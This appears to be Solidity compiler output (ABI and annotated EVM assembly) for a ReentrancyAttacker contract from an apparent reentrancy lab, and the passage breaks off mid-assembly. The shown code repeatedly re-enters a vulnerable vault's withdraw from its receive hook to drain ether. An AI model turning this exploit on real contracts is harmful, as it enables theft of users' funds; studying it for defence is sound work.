{
	"contracts/Reentrancy/VulnerableVault.sol": {
		"ReentrancyAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vaultAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackCount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "stolenAmount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vault",
					"outputs": [
						{
							"internalType": "contract VulnerableVault",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Reentrancy/VulnerableVault.sol\":928:1928  contract ReentrancyAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":1067:1159  constructor(address _vaultAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":1137:1150  _vaultAddress */\n  dup1\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":1113:1118  vault */\n  0x00\n  0x00\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":1113:1151  vault = VulnerableVault(_vaultAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":1067:1159  constructor(address _vaultAddress) {... */\n  pop\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":928:1928  contract ReentrancyAttacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Reentrancy/VulnerableVault.sol\":928:1928  contract ReentrancyAttacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":928:1928  contract ReentrancyAttacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3ccfd60b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xa533d40e\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xfbfa77cf\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1558:1569  attackCount */\n      0x01\n      0x00\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1558:1571  attackCount++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_11\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1598:1607  msg.value */\n      callvalue\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1582:1594  stolenAmount */\n      0x02\n      0x00\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1582:1607  stolenAmount += msg.value */\n      dup3\n      dup3\n      sload\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1654:1661  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1632:1637  vault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1632:1648  vault.getBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x12065fe0\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1632:1650  vault.getBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1632:1661  vault.getBalance() >= 1 ether */\n      lt\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1628:1706  if (vault.getBalance() >= 1 ether) {... */\n      tag_19\n      jumpi\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1678:1683  vault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1678:1692  vault.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1678:1694  vault.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      revert(0x00, 0x00)\n    tag_20:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1628:1706  if (vault.getBalance() >= 1 ether) {... */\n    tag_19:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":928:1928  contract ReentrancyAttacker {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1719:1820  function getBalance() external view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_23\n      jumpi\n      revert(0x00, 0x00)\n    tag_23:\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1826:1925  function withdraw() external {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_28\n      jumpi\n      revert(0x00, 0x00)\n    tag_28:\n      pop\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":998:1024  uint256 public attackCount */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_31\n      jumpi\n      revert(0x00, 0x00)\n    tag_31:\n      pop\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      tag_34\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1186:1461  function attack() external payable {... */\n    tag_6:\n      tag_35\n      tag_36\n      jump\t// in\n    tag_35:\n      stop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1031:1058  uint256 public stolenAmount */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_37\n      jumpi\n      revert(0x00, 0x00)\n    tag_37:\n      pop\n      tag_38\n      tag_39\n      jump\t// in\n    tag_38:\n      mload(0x40)\n      tag_40\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_40:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":963:991  VulnerableVault public vault */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_41\n      jumpi\n      revert(0x00, 0x00)\n    tag_41:\n      pop\n      tag_42\n      tag_43\n      jump\t// in\n    tag_42:\n      mload(0x40)\n      tag_44\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1719:1820  function getBalance() external view returns (uint256) {... */\n    tag_25:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1764:1771  uint256 */\n      0x00\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1791:1812  address(this).balance */\n      selfbalance\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1784:1812  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1719:1820  function getBalance() external view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1826:1925  function withdraw() external {... */\n    tag_30:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1874:1884  msg.sender */\n      caller\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1866:1894  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1866:1917  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1895:1916  address(this).balance */\n      selfbalance\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1866:1917  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1826:1925  function withdraw() external {... */\n      jump\t// out\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":998:1024  uint256 public attackCount */\n    tag_33:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1186:1461  function attack() external payable {... */\n    tag_36:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1253:1260  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1240:1249  msg.value */\n      callvalue\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1240:1260  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1232:1286  require(msg.value >= 1 ether, \"Need at least 1 ether\") */\n      tag_51\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_52\n      swap1\n      tag_53\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_51:\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1354:1359  vault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1354:1367  vault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1375:1384  msg.value */\n      callvalue\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1354:1387  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      revert(0x00, 0x00)\n    tag_54:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_56\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_56:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1409:1414  vault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1409:1423  vault.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1409:1425  vault.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_57\n      jumpi\n      revert(0x00, 0x00)\n    tag_57:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_59:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1186:1461  function attack() external payable {... */\n      jump\t// out\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":1031:1058  uint256 public stolenAmount */\n    tag_39:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"contracts/Reentrancy/VulnerableVault.sol\":963:991  VulnerableVault public vault */\n    tag_43:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:187   */\n    tag_60:\n        /* \"#utility.yul\":55:132   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":52:53   */\n      0x00\n        /* \"#utility.yul\":45:133   */\n      mstore\n        /* \"#utility.yul\":152:156   */\n      0x11\n        /* \"#utility.yul\":149:150   */\n      0x04\n        /* \"#utility.yul\":142:157   */\n      mstore\n        /* \"#utility.yul\":176:180   */\n      0x24\n        /* \"#utility.yul\":173:174   */\n      0x00\n        /* \"#utility.yul\":166:181   */\n      revert\n        /* \"#utility.yul\":193:270   */\n    tag_61:\n        /* \"#utility.yul\":230:237   */\n      0x00\n        /* \"#utility.yul\":259:264   */\n      dup2\n        /* \"#utility.yul\":248:264   */\n      swap1\n      pop\n        /* \"#utility.yul\":193:270   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:509   */\n    tag_12:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":338:362   */\n      tag_81\n        /* \"#utility.yul\":356:361   */\n      dup3\n        /* \"#utility.yul\":338:362   */\n      tag_61\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":329:362   */\n      swap2\n      pop\n        /* \"#utility.yul\":384:450   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":377:382   */\n      dup3\n        /* \"#utility.yul\":374:451   */\n      sub\n        /* \"#utility.yul\":371:474   */\n      tag_82\n      jumpi\n        /* \"#utility.yul\":454:472   */\n      tag_83\n      tag_60\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":371:474   */\n    tag_82:\n        /* \"#utility.yul\":501:502   */\n      0x01\n        /* \"#utility.yul\":494:499   */\n      dup3\n        /* \"#utility.yul\":490:503   */\n      add\n        /* \"#utility.yul\":483:503   */\n      swap1\n      pop\n        /* \"#utility.yul\":276:509   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:706   */\n    tag_14:\n        /* \"#utility.yul\":555:558   */\n      0x00\n        /* \"#utility.yul\":574:594   */\n      tag_85\n        /* \"#utility.yul\":592:593   */\n      dup3\n        /* \"#utility.yul\":574:594   */\n      tag_61\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":569:594   */\n      swap2\n      pop\n        /* \"#utility.yul\":608:628   */\n      tag_86\n        /* \"#utility.yul\":626:627   */\n      dup4\n        /* \"#utility.yul\":608:628   */\n      tag_61\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":603:628   */\n      swap3\n      pop\n        /* \"#utility.yul\":651:652   */\n      dup3\n        /* \"#utility.yul\":648:649   */\n      dup3\n        /* \"#utility.yul\":644:653   */\n      add\n        /* \"#utility.yul\":637:653   */\n      swap1\n      pop\n        /* \"#utility.yul\":672:675   */\n      dup1\n        /* \"#utility.yul\":669:670   */\n      dup3\n        /* \"#utility.yul\":666:676   */\n      gt\n        /* \"#utility.yul\":663:699   */\n      iszero\n      tag_87\n      jumpi\n        /* \"#utility.yul\":679:697   */\n      tag_88\n      tag_60\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":663:699   */\n    tag_87:\n        /* \"#utility.yul\":515:706   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":793:910   */\n    tag_63:\n        /* \"#utility.yul\":902:903   */\n      0x00\n        /* \"#utility.yul\":899:900   */\n      0x00\n        /* \"#utility.yul\":892:904   */\n      revert\n        /* \"#utility.yul\":1039:1161   */\n    tag_65:\n        /* \"#utility.yul\":1112:1136   */\n      tag_93\n        /* \"#utility.yul\":1130:1135   */\n      dup2\n        /* \"#utility.yul\":1112:1136   */\n      tag_61\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1105:1110   */\n      dup2\n        /* \"#utility.yul\":1102:1137   */\n      eq\n        /* \"#utility.yul\":1092:1155   */\n      tag_94\n      jumpi\n        /* \"#utility.yul\":1151:1152   */\n      0x00\n        /* \"#utility.yul\":1148:1149   */\n      0x00\n        /* \"#utility.yul\":1141:1153   */\n      revert\n        /* \"#utility.yul\":1092:1155   */\n    tag_94:\n        /* \"#utility.yul\":1039:1161   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1167:1310   */\n    tag_66:\n        /* \"#utility.yul\":1224:1229   */\n      0x00\n        /* \"#utility.yul\":1255:1261   */\n      dup2\n        /* \"#utility.yul\":1249:1262   */\n      mload\n        /* \"#utility.yul\":1240:1262   */\n      swap1\n      pop\n        /* \"#utility.yul\":1271:1304   */\n      tag_96\n        /* \"#utility.yul\":1298:1303   */\n      dup2\n        /* \"#utility.yul\":1271:1304   */\n      tag_65\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":1167:1310   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1316:1667   */\n    tag_18:\n        /* \"#utility.yul\":1386:1392   */\n      0x00\n        /* \"#utility.yul\":1435:1437   */\n      0x20\n        /* \"#utility.yul\":1423:1432   */\n      dup3\n        /* \"#utility.yul\":1414:1421   */\n      dup5\n        /* \"#utility.yul\":1410:1433   */\n      sub\n        /* \"#utility.yul\":1406:1438   */\n      slt\n        /* \"#utility.yul\":1403:1522   */\n      iszero\n      tag_98\n      jumpi\n        /* \"#utility.yul\":1441:1520   */\n      tag_99\n      tag_63\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":1403:1522   */\n    tag_98:\n        /* \"#utility.yul\":1561:1562   */\n      0x00\n        /* \"#utility.yul\":1586:1650   */\n      tag_100\n        /* \"#utility.yul\":1642:1649   */\n      dup5\n        /* \"#utility.yul\":1633:1639   */\n      dup3\n        /* \"#utility.yul\":1622:1631   */\n      dup6\n        /* \"#utility.yul\":1618:1640   */\n      add\n        /* \"#utility.yul\":1586:1650   */\n      tag_66\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":1576:1650   */\n      swap2\n      pop\n        /* \"#utility.yul\":1532:1660   */\n      pop\n        /* \"#utility.yul\":1316:1667   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1673:1791   */\n    tag_67:\n        /* \"#utility.yul\":1760:1784   */\n      tag_102\n        /* \"#utility.yul\":1778:1783   */\n      dup2\n        /* \"#utility.yul\":1760:1784   */\n      tag_61\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":1755:1758   */\n      dup3\n        /* \"#utility.yul\":1748:1785   */\n      mstore\n        /* \"#utility.yul\":1673:1791   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1797:2019   */\n    tag_27:\n        /* \"#utility.yul\":1890:1894   */\n      0x00\n        /* \"#utility.yul\":1928:1930   */\n      0x20\n        /* \"#utility.yul\":1917:1926   */\n      dup3\n        /* \"#utility.yul\":1913:1931   */\n      add\n        /* \"#utility.yul\":1905:1931   */\n      swap1\n      pop\n        /* \"#utility.yul\":1941:2012   */\n      tag_104\n        /* \"#utility.yul\":2009:2010   */\n      0x00\n        /* \"#utility.yul\":1998:2007   */\n      dup4\n        /* \"#utility.yul\":1994:2011   */\n      add\n        /* \"#utility.yul\":1985:1991   */\n      dup5\n        /* \"#utility.yul\":1941:2012   */\n      tag_67\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":1797:2019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2025:2151   */\n    tag_68:\n        /* \"#utility.yul\":2062:2069   */\n      0x00\n        /* \"#utility.yul\":2102:2144   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2095:2100   */\n      dup3\n        /* \"#utility.yul\":2091:2145   */\n      and\n        /* \"#utility.yul\":2080:2145   */\n      swap1\n      pop\n        /* \"#utility.yul\":2025:2151   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2157:2217   */\n    tag_69:\n        /* \"#utility.yul\":2185:2188   */\n      0x00\n        /* \"#utility.yul\":2206:2211   */\n      dup2\n        /* \"#utility.yul\":2199:2211   */\n      swap1\n      pop\n        /* \"#utility.yul\":2157:2217   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2223:2365   */\n    tag_70:\n        /* \"#utility.yul\":2273:2282   */\n      0x00\n        /* \"#utility.yul\":2306:2359   */\n      tag_108\n        /* \"#utility.yul\":2324:2358   */\n      tag_109\n        /* \"#utility.yul\":2333:2357   */\n      tag_110\n        /* \"#utility.yul\":2351:2356   */\n      dup5\n        /* \"#utility.yul\":2333:2357   */\n      tag_68\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":2324:2358   */\n      tag_69\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2306:2359   */\n      tag_68\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":2293:2359   */\n      swap1\n      pop\n        /* \"#utility.yul\":2223:2365   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2371:2497   */\n    tag_71:\n        /* \"#utility.yul\":2421:2430   */\n      0x00\n        /* \"#utility.yul\":2454:2491   */\n      tag_112\n        /* \"#utility.yul\":2485:2490   */\n      dup3\n        /* \"#utility.yul\":2454:2491   */\n      tag_70\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":2441:2491   */\n      swap1\n      pop\n        /* \"#utility.yul\":2371:2497   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2503:2651   */\n    tag_72:\n        /* \"#utility.yul\":2575:2584   */\n      0x00\n        /* \"#utility.yul\":2608:2645   */\n      tag_114\n        /* \"#utility.yul\":2639:2644   */\n      dup3\n        /* \"#utility.yul\":2608:2645   */\n      tag_71\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":2595:2645   */\n      swap1\n      pop\n        /* \"#utility.yul\":2503:2651   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2657:2832   */\n    tag_73:\n        /* \"#utility.yul\":2766:2825   */\n      tag_116\n        /* \"#utility.yul\":2819:2824   */\n      dup2\n        /* \"#utility.yul\":2766:2825   */\n      tag_72\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":2761:2764   */\n      dup3\n        /* \"#utility.yul\":2754:2826   */\n      mstore\n        /* \"#utility.yul\":2657:2832   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2838:3104   */\n    tag_45:\n        /* 